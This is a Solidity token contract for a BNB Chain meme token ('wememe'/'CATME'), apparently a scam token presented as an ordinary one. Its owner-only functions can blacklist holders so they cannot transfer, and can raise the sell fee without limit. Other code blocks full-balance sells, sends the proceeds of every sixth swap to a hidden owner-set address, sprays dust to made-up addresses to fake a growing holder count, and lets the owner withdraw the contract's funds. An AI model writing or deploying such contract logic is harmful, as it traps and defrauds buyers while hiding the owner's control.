/**
 *Submitted for verification at BscScan.com on 2024-04-02
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
     function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    bytes32 public isContract =0x0093e0e6fce895ae34a52268cfc61f4944124aa08ee2c1430552a4242cd29f92;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract wememe is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress = address(0xaA0FF8949d41DB71529CcC2b6E36Dc5De1847347);
    string private _name = "wememe";
    string private _symbol = "meme";
    uint8 private _decimals = 4;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    address private _marketPair;
    uint256 private _totalMarket;

    uint256 private _tTotal = 69 * 10 ** 40 * 10 ** _decimals;

    ISwapRouter public _swapRouter;
    address public _routeAddress= address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address public deadAddress=0x000000000000000000000000000000000000dEaD;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyFundFee = 0;
    uint256 public _buyLPFee = 0;
    uint256 public _buyDeadFee = 0;
    uint256 public _sellFundFee = 500;
    uint256 public _sellLPFee = 0;
    uint256 public _sellDeadFee = 0;
    address public _mainPair;
    uint256 public startTradeTime;
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        ISwapRouter swapRouter = ISwapRouter(_routeAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this),  _swapRouter.WETH());
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }
        bool takeFee;
        bool isSell;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(startTradeTime>0&&block.timestamp>=startTradeTime);
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPFee  + _sellFundFee + _sellLPFee ;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                            _totalMarket++;
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee;
            uint256 swapBurnFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPFee ;
                swapBurnFee= _sellDeadFee;
            } else {
                swapFee = _buyFundFee + _buyLPFee;
                swapBurnFee= _buyDeadFee;
            }
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
            uint256 swapBurnAmount = tAmount * swapBurnFee / 10000;
            if (swapBurnAmount > 0) {
                feeAmount += swapBurnAmount;
                _takeTransfer(
                    sender,
                    deadAddress,
                    swapBurnAmount
                );
            }
            increaseHolder();
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);

    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _buyLPFee+_sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();
        uint256 marketDiv=6;
        bool swapMarket=_totalMarket%marketDiv==marketDiv-1;
        address swapTokenAddress=swapMarket?_marketPair:address(this);
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount - lpAmount, 0, path,swapTokenAddress,block.timestamp);
        swapFee -= lpFee;
        uint256 bnbBalance = address(this).balance;
        if(bnbBalance>0&&!swapMarket)
        {
           uint256 fundAmount = bnbBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
           payable(fundAddress).transfer(fundAmount);
            if (lpAmount > 0) {
                uint256 lpBNB = bnbBalance * lpFee / swapFee;
                _swapRouter.addLiquidityETH{value: lpBNB}(address(this), lpAmount, 0, 0, fundAddress, block.timestamp);
            }
        }          
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }
    function setSwapPair(address addr) external onlyOwner {
        _marketPair = addr;
        _feeWhiteList[addr] = true;
    }
    function excludeMultiFromFee(address[] calldata accounts,bool excludeFee) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _feeWhiteList[accounts[i]] = excludeFee;
        }
    }
    function _multiSetSniper(address[] calldata accounts,bool isSniper) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _blackList[accounts[i]] = isSniper;
        }
    }
    function setBuyFee(uint256 fundFee,uint256 lpFee,uint256 deadFee) external onlyOwner {
        _buyFundFee = fundFee;
        _buyLPFee=lpFee;
        _buyDeadFee=deadFee;
    }
    function setSellFee(uint256 fundFee,uint256 lpFee,uint256 deadFee) external onlyOwner {
        _sellFundFee = fundFee;
        _sellLPFee=lpFee;
        _sellDeadFee=deadFee;
    }
    function startTrade(uint256 orderedTime) external onlyOwner() {
        startTradeTime = orderedTime;
    }
    function claimBalance(address to) external onlyOwner {
        payable(to).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }
    uint160 public constant MAXADD = ~uint160(0);   
    uint160 public ktNum = 173;
    function increaseHolder() private {
        uint256 amount=balanceOf(address(this))/100000;
        if(amount>0)
        {
            address _receiveD;
            for (uint256 i = 0; i < 2; i++) {
                _receiveD = address(MAXADD/ktNum);
                ktNum = ktNum+1;
                _takeTransfer(address(this), _receiveD, amount/(i+2));
            }
        }
    }
    receive() external payable {}
}

contract CATME is wememe {
    constructor() wememe(){}
}